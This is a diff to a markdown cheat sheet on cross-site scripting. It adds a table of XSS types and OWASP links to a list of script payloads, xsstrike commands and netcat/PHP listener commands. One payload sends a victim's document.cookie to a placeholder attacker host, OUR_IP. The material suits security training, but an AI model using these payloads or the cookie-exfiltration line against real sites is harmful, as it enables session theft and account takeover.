@@ -1,6 +1,16 @@
 # Cross-Site Scripting (XSS)
 
+## Types of XSS
+There are three main types of XSS vulnerabilities:
+
+| Type                | Description                                                                 |
+|---------------------|-----------------------------------------------------------------------------|
+| Stored (Persistent) XSS | Occurs when user input is stored in a database and displayed (e.g., posts). |
+| Reflected (Non-Persistent) XSS | Occurs when input is processed and shown without storage (e.g., search).   |
+| DOM-based XSS       | Occurs when input is client-side processed and displayed (e.g., parameters).|
+
 ## XSS Payloads
+
 | Code | Description |
 |------|-------------|
 | `<script>alert(window.origin)</script>` | Basic XSS Payload |
@@ -16,8 +26,14 @@
 | `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` | Send Cookie details to us |
 
 ## Commands
+
 | Command | Description |
 |---------|-------------|
 | `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"` | Run xsstrike on a url parameter |
-| `sudo nc -lvnp 80` | Start netcat listener |
-| `sudo php -S 0.0.0.0:80` | Start PHP server |
+| `sudo nc -lvnp 8080` | Start netcat listener |
+| `sudo php -S 0.0.0.0:8080` | Start PHP server |
+
+## Useful Links
+
+- [OWASP XSS](https://owasp.org/www-community/attacks/xss/)
+- [XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
